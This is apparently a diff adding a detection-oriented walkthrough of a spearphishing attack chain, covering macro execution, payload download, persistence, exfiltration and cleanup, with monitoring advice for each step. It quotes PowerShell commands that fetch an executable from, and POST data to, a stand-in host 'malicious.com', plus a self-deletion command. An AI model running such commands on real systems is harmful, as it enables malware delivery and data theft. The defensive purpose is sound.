@@ -1,0 +1,48 @@
+
+1. **Email Delivery**
+   - Application: Outlook
+   - User Action: User receives a spearphishing email from a spoofed address (e.g., admin@fakecompany.com).
+   - Key Artifacts: Email headers indicating spoofing, attachment named "Invoice_2023.docx".
+   - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.
+
+2. **User Interaction**
+   - Application: Outlook
+   - User Action: User opens the email and clicks on the attachment.
+   - Key Artifacts: User clicks on "Enable Content" to allow macros.
+   - Detection: Monitor for user interactions with attachments and enabling macros.
+
+3. **Execution of Malicious Macro**
+   - Application: Microsoft Word
+   - User Action: The macro executes upon enabling content.
+   - Key Artifacts: Macro code that downloads a payload from a remote server.
+   - Detection: Monitor for processes spawned from Word that execute scripts or download files.
+
+4. **Payload Download**
+   - Application: PowerShell
+   - User Action: The macro triggers a PowerShell command to download a malicious executable.
+   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
+   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.
+
+5. **Execution of Malicious Payload**
+   - Application: Windows Explorer
+   - User Action: User inadvertently executes the downloaded payload by double-clicking on it.
+   - Key Artifacts: Executable file located at `C:\Users\User\Downloads\payload.exe`.
+   - Detection: Monitor for execution of newly downloaded executables, especially from the Downloads directory.
+
+6. **Establishing Persistence**
+   - Application: Windows Task Scheduler
+   - User Action: The malicious payload creates a scheduled task to ensure persistence.
+   - Key Artifacts: Scheduled task created with a command to execute the payload at startup.
+   - Detection: Monitor for creation of new scheduled tasks that execute suspicious executables.
+
+7. **Data Exfiltration**
+   - Application: PowerShell
+   - User Action: The malware uses PowerShell to exfiltrate sensitive data to a remote server.
+   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body @{"data"="sensitive_data"}`
+   - Detection: Monitor for PowerShell commands that send data to external servers, especially those using HTTP/HTTPS.
+
+8. **Cleanup and Anti-Analysis**
+   - Application: Windows Command Prompt
+   - User Action: The malware deletes its own executable and any logs to evade detection.
+   - Key Artifacts: Command executed: `del C:\Users\User\Downloads\payload.exe`
+   - Detection: Monitor for deletion of files in the Downloads directory and any unusual command-line activity.
